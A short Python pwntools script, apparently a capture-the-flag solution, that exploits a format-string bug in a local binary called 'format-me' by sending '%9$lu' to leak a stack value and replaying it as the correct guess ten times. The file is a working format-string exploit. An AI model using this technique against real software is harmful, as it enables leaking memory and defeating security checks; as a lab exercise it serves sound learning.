#!/usr/bin/env python3
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
# exe = ELF("./format-me-test")
exe = ELF("./format-me")
r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

INDEX = 9
FMT = f"%{INDEX}$lu".encode()

for _ in range(10):
    r.recvuntil(b"Recipient? ")
    r.sendline(FMT)

    r.recvuntil(b"Sending to ")
    leak_block = r.recvuntil(b"...\n")  
   
    if leak_block.endswith(b"...\n"):
        leaked_bytes = leak_block[:-4]
    else:
        leaked_bytes = leak_block

    
    m = re.search(rb"(-?\d+)", leaked_bytes)
    if not m:
        log.failure(f"No numeric leak found. raw: {leaked_bytes!r}")
        r.close()
        raise SystemExit("Leak failed; verify INDEX or run dump_offsets.py")
    val = m.group(1).decode()  

    
    r.recvuntil(b"Guess? ")
    r.sendline(val.encode())

    # wait for confirmation of correct guess
r.recvuntil(b"Correct code! Package sent.")
r.interactive()